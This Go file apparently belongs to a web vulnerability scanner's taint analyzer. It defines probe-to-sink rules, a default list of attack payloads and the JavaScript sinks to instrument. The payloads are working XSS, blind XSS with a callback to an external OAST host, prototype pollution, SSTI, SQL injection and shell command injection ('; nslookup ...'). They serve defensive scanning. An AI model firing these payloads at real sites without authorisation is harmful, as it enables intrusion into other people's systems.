package taint

import "github.com/xkilldash9x/scalpel-cli/api/schemas"

// TaintFlowPath represents a logical path from a probe (representing a taint
// source) to a sink. This is used to define a ruleset for valid and invalid
// flows to reduce false positives.
type TaintFlowPath struct {
	ProbeType schemas.ProbeType
	SinkType  schemas.TaintSink
}

// ValidTaintFlows is a map that acts as a rules engine, defining the set of
// logical and high-risk taint flows. For example, it validates that an XSS
// probe reaching an `innerHTML` sink is a valid path to report, while a generic
// probe reaching the same sink might be ignored.
var ValidTaintFlows = map[TaintFlowPath]bool{
	{schemas.ProbeTypeXSS, schemas.SinkEval}:                true,
	{schemas.ProbeTypeXSS, schemas.SinkInnerHTML}:           true,
	{schemas.ProbeTypeXSS, schemas.SinkOuterHTML}:           true,
	{schemas.ProbeTypeXSS, schemas.SinkDocumentWrite}:       true,
	{schemas.ProbeTypeXSS, schemas.SinkIframeSrcDoc}:        true,
	{schemas.ProbeTypeXSS, schemas.SinkFunctionConstructor}: true,
	{schemas.ProbeTypeXSS, schemas.SinkScriptSrc}:           true,
	{schemas.ProbeTypeXSS, schemas.SinkIframeSrc}:           true,
	{schemas.ProbeTypeXSS, schemas.SinkNavigation}:          true,
	{schemas.ProbeTypeXSS, schemas.SinkPostMessage}:         true,
	{schemas.ProbeTypeXSS, schemas.SinkWorkerPostMessage}:   true,

	{schemas.ProbeTypeDOMClobbering, schemas.SinkEval}:       true,
	{schemas.ProbeTypeDOMClobbering, schemas.SinkInnerHTML}:  true,
	{schemas.ProbeTypeDOMClobbering, schemas.SinkNavigation}: true,

	{schemas.ProbeTypeSSTI, schemas.SinkEval}:                true,
	{schemas.ProbeTypeSSTI, schemas.SinkInnerHTML}:           true,
	{schemas.ProbeTypeSSTI, schemas.SinkOuterHTML}:           true,
	{schemas.ProbeTypeSSTI, schemas.SinkDocumentWrite}:       true,
	{schemas.ProbeTypeSSTI, schemas.SinkIframeSrcDoc}:        true,
	{schemas.ProbeTypeSSTI, schemas.SinkFunctionConstructor}: true,

	{schemas.ProbeTypeSQLi, schemas.SinkInnerHTML}:         true,
	{schemas.ProbeTypeCmdInjection, schemas.SinkInnerHTML}: true,

	{schemas.ProbeTypeGeneric, schemas.SinkWebSocketSend}:     true,
	{schemas.ProbeTypeGeneric, schemas.SinkXMLHTTPRequest}:    true,
	{schemas.ProbeTypeGeneric, schemas.SinkXMLHTTPRequestURL}: true,
	{schemas.ProbeTypeGeneric, schemas.SinkFetch}:             true,
	{schemas.ProbeTypeGeneric, schemas.SinkFetchURL}:          true,
	{schemas.ProbeTypeGeneric, schemas.SinkNavigation}:        true,
	{schemas.ProbeTypeGeneric, schemas.SinkSendBeacon}:        true,
	{schemas.ProbeTypeGeneric, schemas.SinkWorkerSrc}:         true,

	{schemas.ProbeTypeOAST, schemas.SinkWebSocketSend}:     true,
	{schemas.ProbeTypeOAST, schemas.SinkXMLHTTPRequest}:    true,
	{schemas.ProbeTypeOAST, schemas.SinkXMLHTTPRequestURL}: true,
	{schemas.ProbeTypeOAST, schemas.SinkFetch}:             true,
	{schemas.ProbeTypeOAST, schemas.SinkFetchURL}:          true,
	{schemas.ProbeTypeOAST, schemas.SinkNavigation}:        true,
	{schemas.ProbeTypeOAST, schemas.SinkSendBeacon}:        true,
	{schemas.ProbeTypeOAST, schemas.SinkWorkerSrc}:         true,
}

// DefaultProbes provides a default, comprehensive list of attack payloads
// (probes) for various vulnerability classes, including XSS, SSTI, Prototype
// Pollution, and OAST-based checks. This list serves as the default configuration
// for the taint analyzer.
func DefaultProbes() []ProbeDefinition {
	// Define the execution proof function call.
	executionProofCall := `window.` + JSCallbackExecutionProof + `('{{.Canary}}')`

	// OAST Integration: Define the OAST callback formats.
	// {{.OASTServer}} is replaced by the Analyzer if an OAST provider is configured.
	oastFetch := `fetch('http://{{.OASTServer}}/{{.Canary}}')`
	oastImage := `new Image().src='//{{.OASTServer}}/i/{{.Canary}}'`

	return []ProbeDefinition{
		// -- XSS Probes: Execution-Based (High Confidence) --

		// HTML Injection Context
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "HTML_INJECTION",
			Payload:     `<img src=x onerror=` + executionProofCall + `>`,
			Description: "Classic XSS via image onerror event.",
		},
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "HTML_INJECTION",
			Payload:     `<svg/onload=` + executionProofCall + `>`,
			Description: "XSS via SVG onload event.",
		},
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "HTML_INJECTION",
			Payload:     `<video><source onerror=` + executionProofCall + `></video>`,
			Description: "XSS via video source onerror event (HTML5).",
		},

		// Attribute Injection Context
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "ATTRIBUTE_INJECTION",
			Payload:     `" autofocus onfocus=` + executionProofCall,
			Description: "XSS by breaking out of a double-quoted attribute and using event handlers.",
		},
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "ATTRIBUTE_INJECTION",
			Payload:     `' autofocus onfocus=` + executionProofCall,
			Description: "XSS by breaking out of a single-quoted attribute.",
		},
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "ATTRIBUTE_INJECTION",
			Payload:     `" style="animation-name:x" onanimationstart=` + executionProofCall,
			Description: "XSS via CSS animation event handler.",
		},

		// URI Context (e.g., <a href="...">)
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "URI_INJECTION",
			Payload:     `javascript:` + executionProofCall,
			Description: "XSS via javascript: protocol handler in URI attribute.",
		},

		// JavaScript Injection Context (inside <script> tags)
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "JS_INJECTION",
			Payload:     `';` + executionProofCall + `;//`,
			Description: "XSS by terminating a JS statement (single quote) and executing arbitrary code.",
		},
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "JS_INJECTION",
			Payload:     `</script><script>` + executionProofCall + `</script>`,
			Description: "XSS by closing the current script tag and opening a new one.",
		},
		{
			Type:    schemas.ProbeTypeXSS,
			Context: "JS_INJECTION",
			// Template literal injection (ES6)
			Payload:     "${" + executionProofCall + "}",
			Description: "XSS within JS template literals (backticks).",
		},

		// -- XSS Probes: OAST-Based (Blind XSS) --
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "BLIND_HTML_INJECTION",
			Payload:     `<script src="//{{.OASTServer}}/s/{{.Canary}}"></script>`,
			Description: "Blind XSS via external script loading.",
		},
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "BLIND_JS_INJECTION",
			Payload:     `';` + oastFetch + `;//`,
			Description: "Blind XSS via JS fetch callback (JS context).",
		},
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "BLIND_HTML_INJECTION",
			Payload:     `<img src=x onerror="` + oastImage + `">`,
			Description: "Blind XSS via image onerror (HTML context).",
		},

		// -- DOM Clobbering/Interference --
		{
			Type:    schemas.ProbeTypeDOMClobbering,
			Context: "HTML_INJECTION",
			// Attempts to clobber 'window.someVar.enabled' and trigger execution if logic relies on it.
			Payload:     `<a id=someVar><a id=someVar name=enabled href="javascript:` + executionProofCall + `">ClickMe</a>`,
			Description: "DOM Clobbering (A/A) leading to potential logic bypass or XSS.",
		},
		{
			Type:    schemas.ProbeTypeDOMClobbering,
			Context: "HTML_INJECTION",
			// Attempts to clobber 'window.settings.isAdmin' to true. (Does not execute JS, aims to disrupt logic).
			Payload:     `<form id=settings><input name=isAdmin value=true></form>`,
			Description: "DOM Clobbering (Form/Input) targeting configuration objects.",
		},

		// -- JavaScript Prototype Pollution --
		{
			Type:    schemas.ProbeTypePrototypePollution,
			Context: "JSON_PARSE_MERGE",
			// Pollutes Object.prototype with 'scalpelPolluted' set to the canary.
			// The JS shim detects this pollution.
			Payload:     `{"__proto__":{"scalpelPolluted":"{{.Canary}}"}}`,
			Description: "Prototype Pollution via __proto__ injection (Common).",
		},
		{
			Type:    schemas.ProbeTypePrototypePollution,
			Context: "QS_PARSE_MERGE",
			// Pollution via query string format (common in URL params/hash).
			Payload:     `__proto__[scalpelPolluted]={{.Canary}}`,
			Description: "Prototype Pollution via __proto__ injection (Query String format).",
		},
		{
			Type:    schemas.ProbeTypePrototypePollution,
			Context: "MERGE_CLONE",
			// Pollution via constructor.prototype (sometimes bypasses filters).
			Payload:     `{"constructor":{"prototype":{"scalpelPolluted":"{{.Canary}}"}}}`,
			Description: "Prototype Pollution via constructor.prototype injection.",
		},

		// -- SSTI (Server-Side Template Injection) --
		// These rely on the server evaluating the template and reflecting the XSS payload.
		{
			Type:        schemas.ProbeTypeSSTI,
			Context:     "TEMPLATE_EVAL_XSS",
			Payload:     `${7 * 7}<img src=x onerror=` + executionProofCall + `>`,
			Description: "SSTI leading to XSS (JSP/EL/Velocity/Spring).",
		},
		{
			Type:        schemas.ProbeTypeSSTI,
			Context:     "TEMPLATE_EVAL_XSS",
			Payload:     `{{7*7}}<img src=x onerror=` + executionProofCall + `>`,
			Description: "SSTI leading to XSS (Twig/Jinja2/Handlebars/AngularJS).",
		},

		// -- OAST (SSRF, Blind RCE, etc.) --
		// These probes test if user input influences server-side requests or commands.
		{
			Type:        schemas.ProbeTypeOAST,
			Context:     "SSRF_HTTP",
			Payload:     `http://{{.OASTServer}}/ssrf/{{.Canary}}`,
			Description: "SSRF via HTTP URL injection.",
		},
		{
			Type:    schemas.ProbeTypeOAST,
			Context: "BLIND_RCE_DNS",
			// Attempts to execute nslookup/ping to trigger a DNS interaction.
			Payload:     `; nslookup {{.Canary}}.{{.OASTServer}} #`,
			Description: "Blind RCE (Linux) via command injection triggering DNS interaction.",
		},

		// -- SQLi & Command Injection (Reflected as XSS) --
		// These test if backend injections result in reflected XSS.
		{
			Type:        schemas.ProbeTypeSQLi,
			Context:     "REFLECTED_XSS",
			Payload:     `' OR '1'='1 <script>` + executionProofCall + `</script>`,
			Description: "Reflected SQLi leading to XSS.",
		},
		{
			Type:        schemas.ProbeTypeCmdInjection,
			Context:     "REFLECTED_XSS",
			Payload:     `; echo '<script>` + executionProofCall + `</script>' #`,
			Description: "Reflected Command Injection leading to XSS.",
		},

		// -- Generic Data Flow Tracking --
		{
			Type:        schemas.ProbeTypeGeneric,
			Context:     "UNKNOWN",
			Payload:     `GENERIC_{{.Canary}}`,
			Description: "Generic canary tracking for data flow analysis (leakage/exfiltration).",
		},
	}
}

// DefaultSinks provides a default list of JavaScript functions, properties, and
// methods to be instrumented by the taint analysis shim. This list covers a wide
// range of common sinks for vulnerabilities like XSS, open redirect, and data
// exfiltration.
func DefaultSinks() []SinkDefinition {
	return []SinkDefinition{
		// -- Execution Sinks (High Risk) --
		{Name: "eval", Type: schemas.SinkEval, Setter: false, ArgIndex: 0}, // Global eval
		// setTimeout/setInterval are only dangerous if the first argument is a string.
		{Name: "setTimeout", Type: schemas.SinkEval, Setter: false, ArgIndex: 0, ConditionID: "IS_STRING_ARG0"},
		{Name: "setInterval", Type: schemas.SinkEval, Setter: false, ArgIndex: 0, ConditionID: "IS_STRING_ARG0"},
		// Function constructor sinks
		{Name: "Function", Type: schemas.SinkFunctionConstructor, Setter: false, ArgIndex: 0},
		{Name: "Function.prototype.constructor", Type: schemas.SinkFunctionConstructor, Setter: false, ArgIndex: 0},

		// -- DOM Manipulation & HTML Rendering Sinks --
		{Name: "document.write", Type: schemas.SinkDocumentWrite, Setter: false, ArgIndex: 0},
		{Name: "document.writeln", Type: schemas.SinkDocumentWrite, Setter: false, ArgIndex: 0},

		// These apply to standard DOM and Shadow DOM elements due to prototype inheritance.
		{Name: "Element.prototype.innerHTML", Type: schemas.SinkInnerHTML, Setter: true},
		{Name: "Element.prototype.outerHTML", Type: schemas.SinkOuterHTML, Setter: true},
		{Name: "Element.prototype.insertAdjacentHTML", Type: schemas.SinkInnerHTML, Setter: false, ArgIndex: 1},

		// DOMParser sink
		{Name: "DOMParser.prototype.parseFromString", Type: schemas.SinkInnerHTML, Setter: false, ArgIndex: 0},

		// jQuery sinks (Common sources of DOM XSS)
		{Name: "jQuery.prototype.html", Type: schemas.SinkInnerHTML, Setter: false, ArgIndex: 0},
		{Name: "jQuery.prototype.append", Type: schemas.SinkInnerHTML, Setter: false, ArgIndex: 0},
		{Name: "jQuery.prototype.prepend", Type: schemas.SinkInnerHTML, Setter: false, ArgIndex: 0},
		{Name: "jQuery.prototype.after", Type: schemas.SinkInnerHTML, Setter: false, ArgIndex: 0},
		{Name: "jQuery.prototype.before", Type: schemas.SinkInnerHTML, Setter: false, ArgIndex: 0},
		{Name: "jQuery.prototype.replaceWith", Type: schemas.SinkInnerHTML, Setter: false, ArgIndex: 0},
		{Name: "jQuery.globalEval", Type: schemas.SinkEval, Setter: false, ArgIndex: 0},
		{Name: "jQuery.parseHTML", Type: schemas.SinkInnerHTML, Setter: false, ArgIndex: 0},

		// -- Navigation Sinks (Open Redirect / Protocol-based XSS / SPA Routing) --
		/*
			FIX: Instrument Location.prototype instead of the 'location' instance (e.g., window.location).
			Browsers lock down the 'location' object instance ([LegacyUnforgeable] attributes in WebIDL),
			preventing modification of its methods/properties directly on the instance.
			Instrumenting the prototype is allowed and effective across modern browsers.
		*/
		// Instrumenting the 'href' setter on the prototype covers both `location.href = X` and `location = X`.
		{Name: "Location.prototype.href", Type: schemas.SinkNavigation, Setter: true},
		{Name: "Location.prototype.assign", Type: schemas.SinkNavigation, Setter: false, ArgIndex: 0},
		{Name: "Location.prototype.replace", Type: schemas.SinkNavigation, Setter: false, ArgIndex: 0},

		{Name: "open", Type: schemas.SinkNavigation, Setter: false, ArgIndex: 0}, // Global open (window.open)

		// History API (SPA Navigation/DOM XSS vectors) - Added for increased effectiveness in SPAs.
		// The URL is the 3rd argument (index 2).
		{Name: "History.prototype.pushState", Type: schemas.SinkNavigation, Setter: false, ArgIndex: 2},
		{Name: "History.prototype.replaceState", Type: schemas.SinkNavigation, Setter: false, ArgIndex: 2},

		// -- Resource Loading Sinks --
		{Name: "HTMLScriptElement.prototype.src", Type: schemas.SinkScriptSrc, Setter: true},
		{Name: "HTMLIFrameElement.prototype.src", Type: schemas.SinkIframeSrc, Setter: true},
		{Name: "HTMLIFrameElement.prototype.srcdoc", Type: schemas.SinkIframeSrcDoc, Setter: true},

		// -- Data Exfiltration / Network Sinks --
		{Name: "WebSocket.prototype.send", Type: schemas.SinkWebSocketSend, Setter: false, ArgIndex: 0},

		// navigator.sendBeacon (Arg 1 is the data)
		{Name: "navigator.sendBeacon", Type: schemas.SinkSendBeacon, Setter: false, ArgIndex: 1, ConditionID: "SEND_BEACON_DATA_EXISTS"},

		// XHR: Body (send) or URL (open)
		{Name: "XMLHttpRequest.prototype.send", Type: schemas.SinkXMLHTTPRequest, Setter: false, ArgIndex: 0, ConditionID: "XHR_SEND_DATA_EXISTS"},
		{Name: "XMLHttpRequest.prototype.open", Type: schemas.SinkXMLHTTPRequestURL, Setter: false, ArgIndex: 1},

		// Fetch: URL (arg 0) or Body (arg 1) - Handled dynamically in JS Shim
		{Name: "fetch", Type: schemas.SinkFetchURL, Setter: false, ArgIndex: 0},
		{Name: "fetch", Type: schemas.SinkFetch, Setter: false, ArgIndex: 1},

		// -- Inter-Process Communication (IPC) Sinks --

		// window.postMessage (Taint flowing to other windows/iframes)
		{Name: "Window.prototype.postMessage", Type: schemas.SinkPostMessage, Setter: false, ArgIndex: 0},
		// Worker.postMessage (Taint flowing to Web Workers)
		{Name: "Worker.prototype.postMessage", Type: schemas.SinkWorkerPostMessage, Setter: false, ArgIndex: 0},
		// DedicatedWorkerGlobalScope.postMessage (Taint flowing from Worker back to main thread)
		{Name: "DedicatedWorkerGlobalScope.prototype.postMessage", Type: schemas.SinkPostMessage, Setter: false, ArgIndex: 0},
	}
}
